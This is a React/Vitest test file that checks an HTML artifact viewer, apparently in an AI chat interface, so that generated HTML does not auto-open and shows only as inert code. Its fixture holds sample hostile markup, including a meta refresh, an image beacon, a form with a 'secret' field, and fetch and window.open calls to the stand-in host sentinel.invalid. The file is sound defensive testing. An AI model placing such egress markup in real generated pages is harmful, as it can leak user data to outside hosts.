import { act, fireEvent, render, screen, waitFor } from '@testing-library/react'
import { beforeEach, describe, expect, it } from 'vitest'
import { ArtifactTrigger } from '../ArtifactPanel'
import { HtmlArtifact } from '../HtmlArtifact'
import { useArtifactStore } from '@/stores/artifact-store'

const hostileHtml = `<!doctype html>
<html>
  <head><meta http-equiv="refresh" content="0;url=https://sentinel.invalid/refresh"></head>
  <body>
    <img src="https://sentinel.invalid/image.png">
    <form action="https://sentinel.invalid/form"><input name="secret"></form>
    <script>
      fetch('https://sentinel.invalid/fetch')
      window.open('https://sentinel.invalid/popup')
    </script>
  </body>
</html>`

describe('HTML artifact egress boundary', () => {
  beforeEach(() => {
    act(() => useArtifactStore.getState().close())
  })

  it('does not auto-open an HTML artifact when generation settles', () => {
    const { rerender } = render(
      <ArtifactTrigger code={hostileHtml.slice(0, 80)} streaming />
    )

    rerender(<ArtifactTrigger code={hostileHtml} streaming={false} />)

    expect(useArtifactStore.getState().isOpen).toBe(false)
    fireEvent.click(screen.getByRole('button', { name: /html file/i }))
    expect(useArtifactStore.getState().isOpen).toBe(true)
  })

  it('shows generated HTML only as inert code', async () => {
    const { container } = render(<HtmlArtifact code={hostileHtml} />)

    for (const activeElement of ['iframe', 'img', 'form', 'script']) {
      expect(container.querySelector(activeElement)).toBeNull()
    }
    expect(screen.queryByRole('button', { name: /preview/i })).toBeNull()
    await waitFor(() => {
      expect(container.textContent).toContain('sentinel.invalid/image.png')
      expect(container.textContent).toContain('sentinel.invalid/fetch')
    })
    expect(screen.getByText('HTML code')).toBeInTheDocument()
  })
})
